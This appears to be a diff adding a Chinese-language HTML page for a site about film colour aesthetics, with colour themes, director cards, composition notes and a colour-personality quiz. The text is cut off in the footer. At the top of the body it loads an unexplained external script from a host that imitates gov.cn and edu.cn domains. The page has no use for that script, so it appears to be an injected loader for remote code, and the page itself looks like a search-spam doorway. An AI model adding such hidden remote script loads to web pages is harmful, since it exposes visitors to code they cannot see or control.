@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>色悠悠电影网 - 色彩美学 · 视觉系电影 · 调色板观影</title>
+<meta name="description" content="色悠悠电影网(https://seyouyoudianyingwang-h5.github.io)是一个专注于电影色彩美学与视觉艺术的影视平台，提供色彩专题、调色板观影指南、视觉系导演分析和画面构图解析。">
+<meta name="keywords" content="色悠悠电影网, seyouyoudianyingwang-h5, 色彩美学, 视觉系电影, 电影调色, 画面构图, 色彩专题, 艺术电影">
+<meta name="author" content="色悠悠电影网">
+<meta name="robots" content="index, follow">
+<style>
+/* ================= 全局 ================= */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --morandi-rose:#d4a5a5;
+  --morandi-sage:#a5c4b8;
+  --morandi-sky:#a5b8d4;
+  --morandi-lavender:#b8a5d4;
+  --morandi-cream:#f5f0eb;
+  --morandi-warm:#e8d5c4;
+  --morandi-clay:#c4a5a5;
+  --morandi-mist:#d5d5d5;
+  --text-dark:#3d3530;
+  --text-body:#6b5d54;
+  --text-light:#9e8e82;
+  --card-bg:#faf8f5;
+  --shadow:0 4px 20px rgba(0,0,0,0.06);
+  --shadow-lg:0 12px 40px rgba(0,0,0,0.1);
+  --radius:18px;
+}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--morandi-cream);
+  color:var(--text-dark);
+  line-height:1.8;
+  overflow-x:hidden;
+}
+
+/* ================= 色彩粒子背景 ================= */
+.color-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;background:var(--morandi-cream)}
+.color-dot{
+  position:absolute;border-radius:50%;opacity:.12;animation:float-dot 8s ease-in-out infinite;
+}
+.color-dot:nth-child(1){width:120px;height:120px;background:var(--morandi-rose);top:10%;left:5%;animation-delay:0s}
+.color-dot:nth-child(2){width:80px;height:80px;background:var(--morandi-sage);top:20%;right:10%;animation-delay:1.5s}
+.color-dot:nth-child(3){width:100px;height:100px;background:var(--morandi-sky);bottom:30%;left:8%;animation-delay:3s}
+.color-dot:nth-child(4){width:60px;height:60px;background:var(--morandi-lavender);bottom:15%;right:15%;animation-delay:2s}
+.color-dot:nth-child(5){width:140px;height:140px;background:var(--morandi-warm);top:50%;left:50%;animation-delay:4s;transform:translate(-50%,-50%)}
+.color-dot:nth-child(6){width:90px;height:90px;background:var(--morandi-clay);top:60%;right:5%;animation-delay:2.5s}
+@keyframes float-dot{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
+
+/* ================= 顶部导航 ================= */
+.topbar{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(250,248,245,0.92);backdrop-filter:blur(16px);
+  border-bottom:1px solid rgba(0,0,0,0.06);
+}
+.topbar-inner{
+  max-width:1200px;margin:0 auto;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;height:60px;
+}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-palette{
+  width:38px;height:38px;border-radius:10px;overflow:hidden;display:flex;
+}
+.brand-palette span{display:block;flex:1;height:100%}
+.brand-palette span:nth-child(1){background:var(--morandi-rose)}
+.brand-palette span:nth-child(2){background:var(--morandi-sage)}
+.brand-palette span:nth-child(3){background:var(--morandi-sky)}
+.brand-palette span:nth-child(4){background:var(--morandi-lavender)}
+.brand-name{font-size:1.15rem;font-weight:800;color:var(--text-dark);letter-spacing:1px}
+.brand-name span{color:var(--morandi-rose)}
+.topnav{display:flex;gap:4px;align-items:center}
+.topnav a{
+  padding:8px 16px;border-radius:8px;font-size:.85rem;font-weight:600;color:var(--text-body);
+  transition:all .3s;
+}
+.topnav a:hover,.topnav a.active{background:rgba(212,165,165,0.12);color:var(--morandi-rose)}
+.topnav a.active{border-bottom:2px solid var(--morandi-rose)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--text-dark);cursor:pointer}
+
+/* ================= Hero 调色板 ================= */
+.hero-palette{
+  position:relative;z-index:1;margin-top:60px;padding:70px 20px 60px;
+}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-text h1{
+  font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.2;margin-bottom:16px;color:var(--text-dark);
+}
+.hero-text h1 .accent{color:var(--morandi-rose)}
+.hero-text p{font-size:1rem;color:var(--text-body);margin-bottom:28px;line-height:1.7}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn-primary{
+  padding:12px 28px;border-radius:10px;background:linear-gradient(135deg,var(--morandi-rose),var(--morandi-lavender));
+  color:#fff;font-weight:700;font-size:.9rem;border:none;cursor:pointer;transition:all .3s;font-family:inherit;
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
+.btn-ghost{
+  padding:12px 28px;border-radius:10px;border:2px solid var(--morandi-rose);color:var(--morandi-rose);
+  font-weight:700;font-size:.9rem;background:transparent;cursor:pointer;transition:all .3s;font-family:inherit;
+}
+.btn-ghost:hover{background:rgba(212,165,165,0.05)}
+.hero-swatches{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:12px;height:340px;
+}
+.swatch{
+  border-radius:16px;display:flex;align-items:flex-end;padding:16px;color:#fff;font-size:.72rem;font-weight:600;
+  transition:all .35s;cursor:pointer;position:relative;overflow:hidden;
+}
+.swatch:hover{transform:translateY(-6px);box-shadow:var(--shadow-lg)}
+.swatch:nth-child(1){background:linear-gradient(180deg,#e74c3c,#c0392b);grid-row:span 2}
+.swatch:nth-child(2){background:linear-gradient(180deg,#2ecc71,#27ae60)}
+.swatch:nth-child(3){background:linear-gradient(180deg,#3498db,#2980b9)}
+.swatch:nth-child(4){background:linear-gradient(180deg,#9b59b6,#8e44ad);grid-row:span 2}
+.swatch:nth-child(5){background:linear-gradient(180deg,#f39c12,#e67e22)}
+.swatch:nth-child(6){background:linear-gradient(180deg,#1abc9c,#16a085)}
+.swatch:nth-child(7){background:linear-gradient(180deg,#e91e63,#c2185b)}
+
+/* ================= 通用容器 ================= */
+.container{max-width:1200px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.section-label{
+  font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--morandi-rose);
+  font-family:"Courier New",monospace;margin-bottom:6px;font-weight:600;
+}
+.section-title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin-bottom:6px;color:var(--text-dark)}
+.section-desc{font-size:.88rem;color:var(--text-body);margin-bottom:32px}
+
+/* ================= 栏目1：色彩专题（色卡网格） ================= */
+.color-themes{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.theme-card{
+  background:var(--card-bg);border-radius:var(--radius);overflow:hidden;
+  box-shadow:var(--shadow);transition:all .35s;cursor:pointer;
+}
+.theme-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.theme-palette-bar{height:100px;display:flex}
+.theme-palette-bar span{display:block;flex:1;height:100%;transition:flex .3s}
+.theme-card:hover .theme-palette-bar span{flex:1.2}
+.theme-body{padding:20px}
+.theme-body h3{font-size:1rem;font-weight:800;margin-bottom:6px;color:var(--text-dark)}
+.theme-body p{font-size:.78rem;color:var(--text-body);line-height:1.6;margin-bottom:10px}
+.theme-body .theme-films{font-size:.7rem;color:var(--morandi-rose);font-weight:600;font-family:"Courier New",monospace}
+
+/* ================= 栏目2：调色板观影指南（横向色阶） ================= */
+.guide-section{background:rgba(212,165,165,0.04)}
+.guide-list{display:flex;flex-direction:column;gap:16px}
+.guide-row{
+  display:grid;grid-template-columns:120px 1fr auto;gap:20px;align-items:center;
+  background:var(--card-bg);border-radius:14px;padding:18px 22px;
+  box-shadow:var(--shadow);transition:all .3s;
+}
+.guide-row:hover{transform:translateX(6px);box-shadow:var(--shadow-lg)}
+.guide-color{display:flex;height:48px;border-radius:8px;overflow:hidden}
+.guide-color span{display:block;flex:1;height:100%}
+.guide-info h3{font-size:.95rem;font-weight:700;margin-bottom:2px;color:var(--text-dark)}
+.guide-info p{font-size:.75rem;color:var(--text-body);line-height:1.5}
+.guide-tag{
+  padding:6px 14px;border-radius:20px;font-size:.7rem;font-weight:600;white-space:nowrap;
+}
+.guide-tag.warm{background:rgba(231,76,60,0.1);color:#e74c3c}
+.guide-tag.cool{background:rgba(52,152,219,0.1);color:#3498db}
+.guide-tag.neutral{background:rgba(149,165,166,0.1);color:#7f8c8d}
+.guide-tag.vibrant{background:rgba(155,89,182,0.1);color:#9b59b6}
+
+/* ================= 栏目3：视觉系导演（渐变头像） ================= */
+.visual-directors{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.director-card{
+  background:var(--card-bg);border-radius:var(--radius);padding:24px;text-align:center;
+  box-shadow:var(--shadow);transition:all .35s;cursor:pointer;position:relative;overflow:hidden;
+}
+.director-card::before{
+  content:'';position:absolute;top:-40px;left:50%;transform:translateX(-50%);width:100px;height:100px;
+  border-radius:50%;opacity:.08;transition:all .3s;
+}
+.director-card:hover::before{width:200px;height:200px;opacity:.12}
+.director-card:nth-child(1)::before{background:#e74c3c}
+.director-card:nth-child(2)::before{background:#3498db}
+.director-card:nth-child(3)::before{background:#2ecc71}
+.director-card:nth-child(4)::before{background:#9b59b6}
+.director-card:nth-child(5)::before{background:#f39c12}
+.director-card:nth-child(6)::before{background:#1abc9c}
+.director-card:hover{transform:translateY(-6px);box-shadow:var(--shadow-lg)}
+.director-avatar{
+  width:72px;height:72px;margin:0 auto 14px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;font-size:1.8rem;color:#fff;position:relative;z-index:1;
+}
+.director-card:nth-child(1) .director-avatar{background:linear-gradient(135deg,#e74c3c,#c0392b)}
+.director-card:nth-child(2) .director-avatar{background:linear-gradient(135deg,#3498db,#2980b9)}
+.director-card:nth-child(3) .director-avatar{background:linear-gradient(135deg,#2ecc71,#27ae60)}
+.director-card:nth-child(4) .director-avatar{background:linear-gradient(135deg,#9b59b6,#8e44ad)}
+.director-card:nth-child(5) .director-avatar{background:linear-gradient(135deg,#f39c12,#e67e22)}
+.director-card:nth-child(6) .director-avatar{background:linear-gradient(135deg,#1abc9c,#16a085)}
+.director-card h3{font-size:.95rem;font-weight:800;margin-bottom:2px;color:var(--text-dark);position:relative;z-index:1}
+.director-card .style-label{font-size:.7rem;color:var(--text-light);font-style:italic;margin-bottom:8px;position:relative;z-index:1}
+.director-card .film-list{font-size:.72rem;color:var(--text-body);line-height:1.5;position:relative;z-index:1}
+
+/* ================= 栏目4：画面构图解析（对比卡片） ================= */
+.composition-section{background:rgba(165,196,184,0.06)}
+.composition-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:20px}
+.compo-card{
+  background:var(--card-bg);border-radius:var(--radius);overflow:hidden;
+  box-shadow:var(--shadow);transition:all .3s;
+}
+.compo-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.compo-visual{
+  height:180px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff;position:relative;
+}
+.compo-card:nth-child(1) .compo-visual{background:linear-gradient(135deg,#e74c3c,#f39c12)}
+.compo-card:nth-child(2) .compo-visual{background:linear-gradient(135deg,#2ecc71,#3498db)}
+.compo-card:nth-child(3) .compo-visual{background:linear-gradient(135deg,#9b59b6,#e74c3c)}
+.compo-card:nth-child(4) .compo-visual{background:linear-gradient(135deg,#34495e,#3498db)}
+.compo-card:nth-child(5) .compo-visual{background:linear-gradient(135deg,#1abc9c,#2ecc71)}
+.compo-card:nth-child(6) .compo-visual{background:linear-gradient(135deg,#e67e22,#c0392b)}
+.compo-body{padding:20px}
+.compo-body h3{font-size:.95rem;font-weight:800;margin-bottom:6px;color:var(--text-dark)}
+.compo-body p{font-size:.78rem;color:var(--text-body);line-height:1.6;margin-bottom:10px}
+.compo-body .compo-type{
+  display:inline-block;padding:3px 10px;border-radius:4px;font-size:.65rem;font-weight:600;
+  background:rgba(212,165,165,0.12);color:var(--morandi-rose);
+}
+
+/* ================= 栏目5：色彩心理测试（交互卡片） ================= */
+.color-quiz{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.quiz-card{
+  background:var(--card-bg);border-radius:var(--radius);padding:24px;text-align:center;
+  box-shadow:var(--shadow);transition:all .3s;cursor:pointer;border-bottom:4px solid transparent;
+}
+.quiz-card:hover{border-bottom-color:var(--morandi-rose);transform:translateY(-4px)}
+.quiz-color-circle{
+  width:64px;height:64px;border-radius:50%;margin:0 auto 14px;
+}
+.quiz-card:nth-child(1) .quiz-color-circle{background:linear-gradient(135deg,#e74c3c,#c0392b)}
+.quiz-card:nth-child(2) .quiz-color-circle{background:linear-gradient(135deg,#3498db,#2980b9)}
+.quiz-card:nth-child(3) .quiz-color-circle{background:linear-gradient(135deg,#2ecc71,#27ae60)}
+.quiz-card:nth-child(4) .quiz-color-circle{background:linear-gradient(135deg,#9b59b6,#8e44ad)}
+.quiz-card:nth-child(5) .quiz-color-circle{background:linear-gradient(135deg,#f39c12,#e67e22)}
+.quiz-card:nth-child(6) .quiz-color-circle{background:linear-gradient(135deg,#1abc9c,#16a085)}
+.quiz-card h3{font-size:.9rem;font-weight:700;margin-bottom:6px;color:var(--text-dark)}
+.quiz-card p{font-size:.72rem;color:var(--text-body);line-height:1.5}
+
+/* ================= Footer ================= */
+.footer{
+  position:relative;z-index:1;background:var(--text-dark);color:var(--morandi-cream);
+  padding:48px 20px 24px;margin-top:50px;
+}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+.footer-brand .brand{margin-bottom:12px}
+.footer-brand p{font-size:.82rem;color:rgba(245,240,235,0.7);line-height:1.6}
+.footer-col h4{font-size:.9rem;font-weight:800;margin-bottom:12px;color:var(--morandi-cream)}
+.footer-col a{display:block;font-size:.8rem;color:rgba(245,240,235,0.6);padding:3px 0;transition:color .25s}
+.footer-col a:hover{color:var(--morandi-rose)}
+.footer-bottom{
+  padding-top:20px;border-top:1px solid rgba(245,240,235,0.15);
+  text-align:center;font-size:.72rem;color:rgba(245,240,235,0.5);
+}
+.footer-bottom a{color:var(--morandi-rose);font-weight:600}
+
+/* ================= 响应式 ================= */
+@media(max-width:1024px){
+  .hero-inner{grid-template-columns:1fr;gap:30px}
+  .hero-swatches{height:200px}
+}
+@media(max-width:768px){
+  .topnav{
+    display:none;position:absolute;top:60px;left:0;right:0;
+    background:rgba(250,248,245,0.96);flex-direction:column;padding:12px 20px;gap:4px;
+    border-bottom:1px solid rgba(0,0,0,0.06);
+  }
+  .topnav.open{display:flex}
+  .topnav a{width:100%;text-align:center;border-radius:8px}
+  .menu-btn{display:block}
+  .hero-palette{padding:40px 16px 36px}
+  .container{padding:36px 16px}
+  .guide-row{grid-template-columns:1fr;gap:10px;text-align:center}
+  .guide-color{justify-content:center}
+  .guide-tag{justify-self:center}
+  .visual-directors{grid-template-columns:repeat(2,1fr)}
+  .composition-grid{grid-template-columns:1fr}
+  .color-quiz{grid-template-columns:repeat(2,1fr)}
+  .footer-grid{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:480px){
+  .visual-directors{grid-template-columns:1fr}
+  .color-quiz{grid-template-columns:1fr}
+  .footer-grid{grid-template-columns:1fr}
+  .hero-text h1{font-size:1.5rem}
+  .hero-swatches{grid-template-columns:repeat(3,1fr);height:auto}
+  .swatch{grid-row:auto!important;height:80px;align-items:flex-end;padding:8px;font-size:.6rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 色彩粒子背景 -->
+<div class="color-bg">
+  <div class="color-dot"></div><div class="color-dot"></div><div class="color-dot"></div>
+  <div class="color-dot"></div><div class="color-dot"></div><div class="color-dot"></div>
+</div>
+
+<!-- ================= 顶部导航 ================= -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <div class="brand-palette"><span></span><span></span><span></span><span></span></div>
+      <div class="brand-name">色悠悠<span>电影网</span></div>
+    </div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#themes">色彩专题</a>
+      <a href="#guide">调色板指南</a>
+      <a href="#directors">视觉导演</a>
+      <a href="#composition">画面构图</a>
+      <a href="#quiz">色彩心理</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<!-- ================= Hero ================= -->
+<section class="hero-palette" id="home">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <h1>用<span class="accent">色彩</span>读懂电影</h1>
+      <p>色悠悠电影网（seyouyoudianyingwang-h5.github.io）是一个专注于电影色彩美学与视觉艺术的影视平台。我们从调色板、构图、光影三个维度，带你看见电影中那些被忽略的色彩语言。</p>
+      <div class="hero-actions">
+        <button class="btn-primary">🎨 开始探索</button>
+        <button class="btn-ghost">🌈 本周色彩</button>
+      </div>
+    </div>
+    <div class="hero-swatches">
+      <div class="swatch">RED</div>
+      <div class="swatch">GREEN</div>
+      <div class="swatch">BLUE</div>
+      <div class="swatch">PURPLE</div>
+      <div class="swatch">ORANGE</div>
+      <div class="swatch">TEAL</div>
+      <div class="swatch">PINK</div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目1：色彩专题 ================= -->
+<div class="container" id="themes">
+  <div class="section-label">— COLOR THEMES —</div>
+  <h2 class="section-title">色彩专题</h2>
+  <p class="section-desc">每一组色彩背后，都是导演的情绪密码</p>
+  <div class="color-themes">
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#e74c3c"></span><span style="background:#c0392b"></span><span style="background:#922b21"></span><span style="background:#641e16"></span></div>
+      <div class="theme-body"><h3>红色：欲望与暴力的光谱</h3><p>从《辛德勒的名单》中唯一的红衣女孩，到《布达佩斯大饭店》的粉色系变奏，红色在电影中如何承载从纯真到血腥的多重语义。</p><div class="theme-films">《辛德勒的名单》《布达佩斯大饭店》《红辣椒》</div></div>
+    </div>
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#2ecc71"></span><span style="background:#27ae60"></span><span style="background:#229954"></span><span style="background:#1e8449"></span></div>
+      <div class="theme-body"><h3>绿色：自然的隐喻与腐坏</h3><p>塔伦蒂诺用绿色作为暴力前奏的预警色，《贫民窟的百万富翁》用绿色构建贫民区的视觉底色。绿色如何游走于生机与腐烂之间。</p><div class="theme-films">《杀死比尔》《贫民窟的百万富翁》《绿里奇迹》</div></div>
+    </div>
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#3498db"></span><span style="background:#2980b9"></span><span style="background:#1f618d"></span><span style="background:#154360"></span></div>
+      <div class="theme-body"><h3>蓝色：忧郁的冷调美学</h3><p>基耶斯洛夫斯基《蓝》中蓝色作为自由与哀悼的视觉载体，以及《银翼杀手2049》中如何用蓝色构建未来荒漠的孤独感。</p><div class="theme-films">《蓝》《银翼杀手2049》《碧海蓝天》</div></div>
+    </div>
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#f39c12"></span><span style="background:#e67e22"></span><span style="background:#ca6f1e"></span><span style="background:#a04000"></span></div>
+      <div class="theme-body"><h3>暖橙：怀旧与黄昏叙事</h3><p>《疯狂的麦克斯：狂暴之路》的橙蓝互补色对比，《爱乐之城》如何用暖橙色调构建洛杉矶的梦幻黄昏。</p><div class="theme-films">《爱乐之城》《疯狂的麦克斯》《末代皇帝》</div></div>
+    </div>
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#9b59b6"></span><span style="background:#8e44ad"></span><span style="background:#76448a"></span><span style="background:#5b2c6f"></span></div>
+      <div class="theme-body"><h3>紫色：神秘与幻觉空间</h3><p>《黑天鹅》中紫色作为心理蜕变的过渡色，《降临》中紫色作为外星语言的非地球色彩暗示。</p><div class="theme-films">《黑天鹅》《降临》《潘神的迷宫》</div></div>
+    </div>
+    <div class="theme-card">
+      <div class="theme-palette-bar"><span style="background:#34495e"></span><span style="background:#2c3e50"></span><span style="background:#1b2631"></span><span style="background:#0d1317"></span></div>
+      <div class="theme-body"><h3>暗灰：工业废墟的视觉诗学</h3><p>《银翼杀手》原版中暗灰作为赛博朋克底色，《罗马》如何用灰调构建1970年代墨西哥城的记忆质感。</p><div class="theme-films">《银翼杀手》《罗马》《机械姬》</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目2：调色板观影指南 ================= -->
+<div class="container guide-section" id="guide">
+  <div class="section-label">— PALETTE GUIDE —</div>
+  <h2 class="section-title">调色板观影指南</h2>
+  <p class="section-desc">按色彩情绪分类的观影推荐</p>
+  <div class="guide-list">
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#e74c3c"></span><span style="background:#c0392b"></span><span style="background:#922b21"></span><span style="background:#f1948a"></span></div>
+      <div class="guide-info"><h3>炽热红调：激情与冲突</h3><p>适合想要感受强烈情感冲击的夜晚，这些电影用红色构建叙事张力。</p></div>
+      <div class="guide-tag warm">8 部推荐</div>
+    </div>
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#2ecc71"></span><span style="background:#27ae60"></span><span style="background:#a9dfbf"></span><span style="background:#1e8449"></span></div>
+      <div class="guide-info"><h3>生机绿调：自然与治愈</h3><p>适合周末午后，让眼睛和心灵一起呼吸新鲜空气的绿色系电影。</p></div>
+      <div class="guide-tag cool">6 部推荐</div>
+    </div>
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#3498db"></span><span style="background:#2980b9"></span><span style="background:#aed6f1"></span><span style="background:#1b4f72"></span></div>
+      <div class="guide-info"><h3>深邃蓝调：孤独与沉思</h3><p>适合雨夜独处时观看，蓝色调电影带你进入内省的精神空间。</p></div>
+      <div class="guide-tag cool">10 部推荐</div>
+    </div>
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#f39c12"></span><span style="background:#e67e22"></span><span style="background:#fad7a0"></span><span style="background:#b9770e"></span></div>
+      <div class="guide-info"><h3>暖金橙调：怀旧与温情</h3><p>适合家庭观影，暖色调电影营造的温馨氛围让人如沐春风。</p></div>
+      <div class="guide-tag warm">7 部推荐</div>
+    </div>
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#9b59b6"></span><span style="background:#8e44ad"></span><span style="background:#d7bde2"></span><span style="background:#4a235a"></span></div>
+      <div class="guide-info"><h3>迷幻紫调：梦境与超现实</h3><p>适合挑战认知边界的深夜，紫色系电影带你进入意识流的迷宫。</p></div>
+      <div class="guide-tag vibrant">5 部推荐</div>
+    </div>
+    <div class="guide-row">
+      <div class="guide-color"><span style="background:#95a5a6"></span><span style="background:#7f8c8d"></span><span style="background:#bdc3c7"></span><span style="background:#34495e"></span></div>
+      <div class="guide-info"><h3>中性灰调：极简与克制</h3><p>适合喜欢留白美学的观众，灰色系电影用最少的色彩说最多的故事。</p></div>
+      <div class="guide-tag neutral">9 部推荐</div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目3：视觉系导演 ================= -->
+<div class="container" id="directors">
+  <div class="section-label">— VISUAL DIRECTORS —</div>
+  <h2 class="section-title">视觉系导演</h2>
+  <p class="section-desc">他们用画面写诗，每一帧都是壁纸</p>
+  <div class="visual-directors">
+    <div class="director-card">
+      <div class="director-avatar">🎨</div>
+      <h3>韦斯·安德森</h3>
+      <div class="style-label">对称构图 · 糖果色调</div>
+      <div class="film-list">《布达佩斯大饭店》<br>《法兰西特派》<br>《小行星城》</div>
+    </div>
+    <div class="director-card">
+      <div class="director-avatar">🌊</div>
+      <h3>罗杰·迪金斯</h3>
+      <div class="style-label">自然光 · 写实影调</div>
+      <div class="film-list">《银翼杀手2049》<br>《1917》<br>《边境杀手》</div>
+    </div>
+    <div class="director-card">
+      <div class="director-avatar">🏮</div>
+      <h3>张艺谋</h3>
+      <div class="style-label">浓烈色彩 · 大色块</div>
+      <div class="film-list">《英雄》<br>《影》<br>《满城尽带黄金甲》</div>
+    </div>
+    <div class="director-card">
+      <div class="director-avatar">🎭</div>
+      <h3>尼古拉·温丁·雷弗恩</h3>
+      <div class="style-label">霓虹美学 · 高饱和</div>
+      <div class="film-list">《亡命驾驶》<br>《霓虹恶魔》<br>《唯神能恕》</div>
+    </div>
+    <div class="director-card">
+      <div class="director-avatar">🍃</div>
+      <h3>侯孝贤</h3>
+      <div class="style-label">长镜头 · 自然色温</div>
+      <div class="film-list">《悲情城市》<br>《刺客聂隐娘》<br>《最好的时光》</div>
+    </div>
+    <div class="director-card">
+      <div class="director-avatar">🔮</div>
+      <h3>丹尼斯·维伦纽瓦</h3>
+      <div class="style-label">宏大构图 · 冷峻蓝灰</div>
+      <div class="film-list">《沙丘》<br>《银翼杀手2049》<br>《降临》</div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目4：画面构图解析 ================= -->
+<div class="container composition-section" id="composition">
+  <div class="section-label">— COMPOSITION ANALYSIS —</div>
+  <h2 class="section-title">画面构图解析</h2>
+  <p class="section-desc">拆解经典镜头的视觉语法</p>
+  <div class="composition-grid">
+    <div class="compo-card">
+      <div class="compo-visual">📐</div>
+      <div class="compo-body"><h3>黄金分割与三分法</h3><p>从《公民凯恩》的深焦构图到《荒野猎人》的自然三分，分析经典电影如何运用基础构图法则引导观众视线。</p><span class="compo-type">构图基础</span></div>
+    </div>
+    <div class="compo-card">
+      <div class="compo-visual">🪟</div>
+      <div class="compo-body"><h3>框架构图与窥视</h3><p>《后窗》中窗户作为框架的双重含义，《闪灵》中门框构图如何制造压迫感。框架不仅是构图工具，更是叙事手段。</p><span class="compo-type">空间叙事</span></div>
+    </div>
+    <div class="compo-card">
+      <div class="compo-visual">➰</div>
+      <div class="compo-body"><h3>引导线与视觉流动</h3><p>《2001太空漫游》中骨骼→飞船的匹配剪辑如何用线条引导视线，《鸟人》长镜头中的隐形引导线设计。</p><span class="compo-type">视觉引导</span></div>
+    </div>
+    <div class="compo-card">
+      <div class="compo-visual">⚖️</div>
+      <div class="compo-body"><h3>对称与失衡</h3><p>韦斯·安德森的强迫症式对称 vs 波兰斯基的故意失衡构图。《布达佩斯大饭店》与《冷血惊魂》的构图哲学对比。</p><span class="compo-type">美学对比</span></div>
+    </div>
+    <div class="compo-card">
+      <div class="compo-visual">🌫️</div>
+      <div class="compo-body"><h3>负空间与留白</h3><p>是枝裕和如何用大量负空间表达孤独，《海边的曼彻斯特》中人物在画面中的微小比例如何强化无力感。</p><span class="compo-type">情绪构图</span></div>
+    </div>
+    <div class="compo-card">
+      <div class="compo-visual">🎞️</div>
+      <div class="compo-body"><h3>色彩对比与互补</h3><p>橙蓝互补色在好莱坞大片的泛滥与革新，《疯狂的麦克斯：狂暴之路》如何用互补色构建末日视觉冲击。</p><span class="compo-type">色彩构图</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= 栏目5：色彩心理测试 ================= -->
+<div class="container" id="quiz">
+  <div class="section-label">— COLOR PERSONALITY —</div>
+  <h2 class="section-title">色彩心理 · 你的观影人格</h2>
+  <p class="section-desc">选择你最被吸引的色彩，发现你的电影审美基因</p>
+  <div class="color-quiz">
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>红色人格</h3>
+      <p>你偏爱情感浓烈、节奏紧凑的电影。你追求感官刺激和情绪宣泄，喜欢导演用色彩直接表达欲望与冲突。</p>
+    </div>
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>蓝色人格</h3>
+      <p>你享受内省与沉思，偏爱慢节奏、高信息密度的电影。你能在冷调画面中找到别人看不见的温暖。</p>
+    </div>
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>绿色人格</h3>
+      <p>你热爱自然、真实和生命力。你偏好写实主义电影，对过度修饰的视觉风格天然排斥。</p>
+    </div>
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>紫色人格</h3>
+      <p>你拥有丰富的想象力和对超现实题材的天然亲近。你能在梦境般的画面中找到现实世界无法给予的自由。</p>
+    </div>
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>橙色人格</h3>
+      <p>你重视情感连接和怀旧体验。温暖的故事和复古色调能最大程度触动你的心弦。</p>
+    </div>
+    <div class="quiz-card">
+      <div class="quiz-color-circle"></div>
+      <h3>灰色人格</h3>
+      <p>你欣赏极简美学和克制表达。你相信"少即是多"，在灰色调的留白中读到最多的故事。</p>
+    </div>
+  </div>
+</div>
+
+<!-- ================= Footer ================= -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <div class="brand"><div class="brand-palette"><span></span><span></span><span></span><span></span></div><div class="brand-name">色悠悠<span>电影网</span></div></div>
+        <p>色悠悠电影网（seyouyoudianyingwang-h5.github.io）是一个专注于电影色彩美学与视觉艺术的影视平台，提供色彩专题、调色板观影指南、视觉系导演分析和画面构图解析。</p>
+      </div>
+      <div class="footer-col"><h4>探索</h4><a href="#themes">色彩专题</a><a href="#guide">调色板指南</a><a href="#composition">构图解析</a><a href="#">色彩词典</a></div>
+      <div class="footer-col"><h4>导演</h4><a href="#directors">视觉系导演</a><a href="#">摄影指导</a><a href="#">美术指导</a><a href="#">调色师</a></div>
+      <div class="footer-col"><h4>关于</h4><a href="#">关于本站</a><a href="#">色彩理论</a><a href="#">投稿指南</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 色悠悠电影网 (Seyouyou Movie Network) - 色彩美学 · 视觉系电影 · 调色板观影</p>
